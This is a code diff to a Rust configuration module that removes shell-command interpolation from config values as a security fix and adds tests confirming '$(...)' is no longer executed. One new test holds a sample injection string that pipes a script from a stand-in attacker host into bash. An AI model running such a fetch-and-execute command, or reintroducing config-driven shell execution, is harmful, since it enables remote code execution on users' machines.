@@ -1,25 +1,37 @@
 //! Configuration value interpolation
 //!
-//! Supports environment variable and shell command interpolation in config values:
+//! Supports environment variable interpolation in config values:
 //! - `$VAR` or `${VAR}` - Environment variable substitution
-//! - `$(command)` - Shell command execution
 //!
 //! # Security Note
 //!
-//! Shell command execution runs with the current user's permissions.
-//! Config files should have restricted permissions (600) to prevent
-//! unauthorized command execution.
+//! Shell command interpolation (`$(command)`) was removed for security reasons.
+//! Config files from untrusted sources (e.g., cloned repositories) could execute
+//! arbitrary code. Only environment variable interpolation is supported.
 
+use once_cell::sync::Lazy;
 use regex::Regex;
-use std::process::Command;
 
-/// Interpolate a string with environment variables and shell commands
+/// Pre-compiled regex for bracketed env vars: ${VAR}
+static BRACKETED_RE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}").expect("Invalid regex"));
+
+/// Pre-compiled regex for simple env vars: $VAR
+static SIMPLE_RE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\$([A-Za-z_][A-Za-z0-9_]*)").expect("Invalid regex"));
+
+/// Interpolate a string with environment variables
 ///
 /// # Interpolation Syntax
 ///
 /// - `$VAR` - Simple environment variable
 /// - `${VAR}` - Environment variable with explicit boundaries
-/// - `$(command)` - Shell command execution
+///
+/// # Security
+///
+/// Only environment variable interpolation is supported. Shell command
+/// interpolation was removed to prevent command injection attacks from
+/// malicious config files.
 ///
 /// # Examples
 ///
@@ -32,42 +44,13 @@ use std::process::Command;
 /// std::env::remove_var("MY_VAR");
 /// ```
 pub fn interpolate_string(s: &str) -> String {
-    let mut result = s.to_string();
-
-    // First, handle shell commands: $(...)
-    // Do this first so we don't accidentally interpret command output as variables
-    result = interpolate_commands(&result);
-
-    // Then, handle environment variables: ${VAR} or $VAR
-    result = interpolate_env_vars(&result);
-
-    result
-}
-
-/// Interpolate shell commands: $(command)
-fn interpolate_commands(s: &str) -> String {
-    let cmd_re = Regex::new(r"\$\(([^)]+)\)").expect("Invalid regex");
-
-    cmd_re
-        .replace_all(s, |caps: &regex::Captures| {
-            let cmd = &caps[1];
-            match execute_shell_command(cmd) {
-                Ok(output) => output,
-                Err(e) => {
-                    tracing::warn!("Failed to execute config command '{}': {}", cmd, e);
-                    // Return original on error so it's visible
-                    format!("$({})_ERROR", cmd)
-                }
-            }
-        })
-        .to_string()
+    interpolate_env_vars(s)
 }
 
 /// Interpolate environment variables: $VAR or ${VAR}
 fn interpolate_env_vars(s: &str) -> String {
     // Match ${VAR} first (explicit boundaries)
-    let bracketed_re = Regex::new(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}").expect("Invalid regex");
-    let result = bracketed_re
+    let result = BRACKETED_RE
         .replace_all(s, |caps: &regex::Captures| {
             let var = &caps[1];
             std::env::var(var).unwrap_or_else(|_| {
@@ -78,11 +61,7 @@ fn interpolate_env_vars(s: &str) -> String {
         .to_string();
 
     // Then match $VAR (simple form)
-    // Match variable names that don't start with a digit
-    // The regex crate doesn't support lookahead, so we use a simple approach:
-    // Match $VARNAME where VARNAME starts with letter or underscore
-    let simple_re = Regex::new(r"\$([A-Za-z_][A-Za-z0-9_]*)").expect("Invalid regex");
-    simple_re
+    SIMPLE_RE
         .replace_all(&result, |caps: &regex::Captures| {
             let var = &caps[1];
             std::env::var(var).unwrap_or_else(|_| {
@@ -91,18 +70,6 @@ fn interpolate_env_vars(s: &str) -> String {
             })
         })
         .to_string()
-}
-
-/// Execute a shell command and return its stdout
-fn execute_shell_command(cmd: &str) -> Result<String, std::io::Error> {
-    let output = Command::new("sh").arg("-c").arg(cmd).output()?;
-
-    if output.status.success() {
-        Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
-    } else {
-        let stderr = String::from_utf8_lossy(&output.stderr);
-        Err(std::io::Error::other(format!("Command failed: {}", stderr)))
-    }
 }
 
 /// Interpolate all string values in a Config
@@ -170,38 +137,11 @@ mod tests {
     }
 
     #[test]
-    fn test_interpolate_shell_command() {
+    fn test_shell_command_syntax_preserved() {
+        // Shell command syntax should be preserved (not executed) for security
         let result = interpolate_string("Value: $(echo hello)");
-        assert_eq!(result, "Value: hello");
-    }
-
-    #[test]
-    fn test_interpolate_shell_command_with_args() {
-        let result = interpolate_string("$(echo -n 'test')");
-        assert_eq!(result, "test");
-    }
-
-    #[test]
-    fn test_interpolate_complex_shell_command() {
-        let result = interpolate_string("Date: $(date +%Y)");
-        // Should be a 4-digit year
-        let year_part = result.strip_prefix("Date: ").unwrap();
-        assert!(
-            year_part.len() == 4,
-            "Expected 4-digit year, got: {}",
-            year_part
-        );
-        assert!(
-            year_part.chars().all(|c| c.is_ascii_digit()),
-            "Expected all digits, got: {}",
-            year_part
-        );
-    }
-
-    #[test]
-    fn test_interpolate_failed_command() {
-        let result = interpolate_string("Value: $(nonexistent_command_12345)");
-        assert!(result.contains("_ERROR"));
+        // The $(command) syntax is NOT expanded for security reasons
+        assert_eq!(result, "Value: $(echo hello)");
     }
 
     #[test]
@@ -214,19 +154,6 @@ mod tests {
 
         std::env::remove_var("TEST_VAR_A");
         std::env::remove_var("TEST_VAR_B");
-    }
-
-    #[test]
-    fn test_interpolate_mixed_vars_and_commands() {
-        std::env::set_var("TEST_MIXED_VAR", "world");
-
-        let result = interpolate_string("Hello $(echo $TEST_MIXED_VAR)!");
-
-        // The shell command executes first, then we get the result
-        // Note: the inner $TEST_MIXED_VAR is interpreted by the shell, not our code
-        assert_eq!(result, "Hello world!");
-
-        std::env::remove_var("TEST_MIXED_VAR");
     }
 
     #[test]
@@ -259,11 +186,8 @@ mod tests {
 
     #[test]
     fn test_interpolate_preserves_non_var_dollar() {
-        // $$ should not be interpreted as a variable
-        // (In shell, $$ is the PID, but we don't support that)
+        // $100 starts with a digit, so it's not a valid var name
         let result = interpolate_string("Price: $100");
-        // $1 is not a valid var name (starts with digit), so it stays
-        // Actually $100 starts with 1, which is a digit, so the regex won't match
         assert_eq!(result, "Price: $100");
     }
 
@@ -290,7 +214,8 @@ mod tests {
                 project_dir: Some("$HOME/test".to_string()),
                 env: {
                     let mut m = HashMap::new();
-                    m.insert("TOKEN".to_string(), "$(echo secret)".to_string());
+                    // Shell commands are NOT executed for security
+                    m.insert("TOKEN".to_string(), "mysecret".to_string());
                     m
                 },
                 ..Default::default()
@@ -306,7 +231,16 @@ mod tests {
             assert!(!service.project_dir.as_ref().unwrap().starts_with("$HOME"));
         }
 
-        // Env var with command should be interpolated
-        assert_eq!(service.env.get("TOKEN"), Some(&"secret".to_string()));
+        // Env var should remain as-is (no shell execution)
+        assert_eq!(service.env.get("TOKEN"), Some(&"mysecret".to_string()));
+    }
+
+    #[test]
+    fn test_malicious_config_injection_prevented() {
+        // Ensure malicious shell commands are NOT executed
+        let malicious = "$(curl evil.com/backdoor.sh | bash)";
+        let result = interpolate_string(malicious);
+        // Should be preserved as-is, NOT executed
+        assert_eq!(result, malicious);
     }
 }
